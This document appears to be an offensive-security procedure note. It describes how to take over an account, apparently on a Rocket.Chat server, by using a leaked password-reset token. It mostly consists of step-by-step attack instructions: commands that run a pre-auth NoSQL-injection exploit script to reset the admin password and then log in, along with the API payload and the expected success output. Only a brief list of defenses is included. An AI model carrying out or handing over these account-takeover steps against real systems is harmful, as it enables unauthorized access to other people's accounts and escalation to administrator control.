---
tags:
  - password-reset
  - account-takeover
type: procedure
tools:
  - '[[tools/pre_auth_nosqli.py]]'
tactics:
  - '[[Credential Access]]'
commands: []
verified: false
platforms:
  - Web
submitted: true
created_at: '2023-10-01T00:00:00Z'
techniques:
  - '[[Valid Accounts]]'
updated_at: '2025-12-14T17:31:30.567Z'
skill_level: intermediate
impact_level: high
detection_risk: low
sub_techniques: []
id: c6bc1240-35f3-43f3-86f0-c675dff0a129
validated: true
mitre_tactics:
  - '[[Credential Access]]'
mitre_techniques:
  - '[[Valid Accounts]]'
---
# Reset-Target-User-Password-Using-Leaked-Token

## Summary

This procedure uses the extracted reset token to change the target's password, achieving account takeover without 2FA or email verification.

## Description

Submit a reset request to the API with the full leaked token and a new password. The endpoint validates the token directly from DB, bypassing user interaction. Works if no TOTP enabled. Leads to login as the target, especially admins for escalation.

## Requirements

1. Full leaked token
2. API access
3. New password (attacker-controlled)

## Defense

Defensive measures and detection strategies:

- Implement token expiration (short TTL)
- Require email confirmation for resets
- Enable 2FA on admin accounts

## Objectives

1. Gain valid credentials
2. Access user account
3. Prepare for privilege abuse

## Instructions

### Step 1: Submit Reset with Token

**Context**: POST to resetPassword endpoint with token and new pass.

**Command** ([[commands/run-exploit-script]]):
```bash
python3 pre_auth_nosqli.py 'http://localhost:3000' 'admin@rocketchat.local' --reset-password --token 'full_leaked_token' --new-password 'newpass123'
```

> API call: {"token":"leaked","newPassword":"newpass"}. Expected output: {"success":true}.

### Step 2: Test Login

**Context**: Verify with login attempt.

**Command** ([[commands/run-exploit-script]]):
```bash
python3 pre_auth_nosqli.py 'http://localhost:3000' 'admin@rocketchat.local' --login --password 'newpass123'
```

> Gains session. Expected: Auth token received.

## MITRE ATT&CK Mapping

### Tactics

- [[Credential Access]]

### Techniques

- [[Valid Accounts]]

### Sub-Techniques


## Commands Used


## Tools Used

- [[tools/pre_auth_nosqli.py]]

## Tags

- password-reset
- account-takeover
